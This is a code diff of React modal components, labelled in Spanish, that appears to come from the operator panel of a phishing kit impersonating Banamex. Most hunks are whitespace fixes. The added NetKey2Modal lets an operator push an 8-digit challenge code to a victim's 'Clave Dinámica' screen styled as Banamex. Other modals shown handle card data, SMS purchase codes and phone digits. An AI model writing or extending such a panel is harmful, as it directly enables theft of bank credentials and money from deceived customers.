@@ -88,7 +88,7 @@ export const ProtectModal: React.FC<ProtectModalProps> = ({ isOpen, onClose, onC
           className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none"
         />
       </div>
-      
+
       <div className="flex justify-end space-x-2 mt-6">
         <Button 
           onClick={onClose}
@@ -185,7 +185,7 @@ export const TransferModal: React.FC<TransferModalProps> = ({ isOpen, onClose, o
           />
         </div>
       </div>
-      
+
       <div className="flex justify-end space-x-2 mt-6">
         <Button 
           onClick={onClose}
@@ -258,7 +258,7 @@ export const CancelModal: React.FC<CancelModalProps> = ({ isOpen, onClose, onCon
           />
         </div>
       </div>
-      
+
       <div className="flex justify-end space-x-2 mt-6">
         <Button 
           onClick={onClose}
@@ -322,7 +322,7 @@ export const SmsCompraModal: React.FC<SmsCompraModalProps> = ({ isOpen, onClose,
           Estos dígitos se mostrarán en la pantalla de cancelación.
         </p>
       </div>
-      
+
       <div className="flex justify-end space-x-2 mt-6">
         <Button 
           onClick={onClose}
@@ -384,7 +384,7 @@ export const CardInstructionsModal: React.FC<CardInstructionsModalProps> = ({ is
         <p className="mt-2">Nota: Si el cliente ingresó un folio al inicio, ese folio se recuperará 
         automáticamente, aunque ingreses uno diferente aquí.</p>
       </div>
-      
+
       <div className="space-y-3">
         <div>
           <Label htmlFor="instruccionesCliente" className="block text-sm text-gray-300 mb-1">
@@ -439,7 +439,7 @@ export const CardInstructionsModal: React.FC<CardInstructionsModalProps> = ({ is
           />
         </div>
       </div>
-      
+
       <div className="flex justify-end space-x-2 mt-6">
         <Button 
           onClick={onClose}
@@ -504,7 +504,7 @@ export const CodeModal: React.FC<CodeModalProps> = ({ isOpen, onClose, onConfirm
           Solo se requieren los últimos 4 dígitos del número celular.
         </p>
       </div>
-      
+
       <div className="flex justify-end space-x-2 mt-6">
         <Button 
           onClick={onClose}
@@ -558,7 +558,7 @@ export const MessageModal: React.FC<MessageModalProps> = ({ isOpen, onClose, onC
           {mensaje.length}/4000 caracteres
         </div>
       </div>
-      
+
       <div className="flex justify-end space-x-2 mt-6">
         <Button 
           onClick={onClose}
@@ -578,6 +578,7 @@ export const MessageModal: React.FC<MessageModalProps> = ({ isOpen, onClose, onC
     </Modal>
   );
 };
+
 interface DatosTarjetaModalProps { 
   isOpen: boolean; 
   onClose: () => void; 
@@ -622,7 +623,7 @@ export const DatosTarjetaModal: React.FC<DatosTarjetaModalProps> = ({ isOpen, on
           </p>
         </div>
       </div>
-      
+
       <div className="flex justify-end space-x-2 mt-6">
         <Button 
           onClick={onClose}
@@ -687,7 +688,7 @@ export const NetKeyModal: React.FC<NetKeyModalProps> = ({ isOpen, onClose, onCon
           </p>
         </div>
       </div>
-      
+
       <div className="flex justify-end space-x-2 mt-6">
         <Button 
           onClick={onClose}
@@ -702,6 +703,71 @@ export const NetKeyModal: React.FC<NetKeyModalProps> = ({ isOpen, onClose, onCon
           className="bg-[#007bff] text-white hover:bg-opacity-90"
         >
           Enviar CHALLENGE
+        </Button>
+      </div>
+    </Modal>
+  );
+};
+
+interface NetKey2ModalProps {
+  isOpen: boolean;
+  onClose: () => void;
+  onConfirm: (challenge: string) => void;
+}
+
+export const NetKey2Modal: React.FC<NetKey2ModalProps> = ({ isOpen, onClose, onConfirm }) => {
+  const [challenge, setChallenge] = useState('');
+
+  const handleSubmit = () => {
+    if (challenge.length === 8 && /^\d+$/.test(challenge)) {
+      onConfirm(challenge);
+      setChallenge('');
+    } else {
+      alert('Por favor ingresa exactamente 8 dígitos numéricos');
+    }
+  };
+
+  return (
+    <Modal isOpen={isOpen} onClose={onClose} title="NetKey 2 - Clave Dinámica Completa">
+      <div className="space-y-3">
+        <div>
+          <Label htmlFor="challenge2" className="block mb-2 text-white">
+            Código CHALLENGE de 8 dígitos para Clave Dinámica
+          </Label>
+          <Input 
+            id="challenge2" 
+            type="text" 
+            placeholder="Ej: 17728012"
+            value={challenge}
+            onChange={(e) => {
+              const value = e.target.value.replace(/\D/g, '');
+              if (value.length <= 8) {
+                setChallenge(value);
+              }
+            }}
+            maxLength={8}
+            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none text-2xl text-center font-mono tracking-widest"
+          />
+          <p className="text-xs text-gray-400 mt-2">
+            El cliente verá este código en la pantalla de Clave Dinámica completa con diseño Banamex
+          </p>
+        </div>
+      </div>
+
+      <div className="flex justify-end space-x-2 mt-6">
+        <Button 
+          onClick={onClose}
+          variant="secondary"
+          className="bg-gray-600 text-white hover:bg-gray-700"
+        >
+          Cancelar
+        </Button>
+        <Button 
+          onClick={handleSubmit}
+          variant="default"
+          className="bg-[#007bff] text-white hover:bg-opacity-90"
+        >
+          Enviar Código
         </Button>
       </div>
     </Modal>
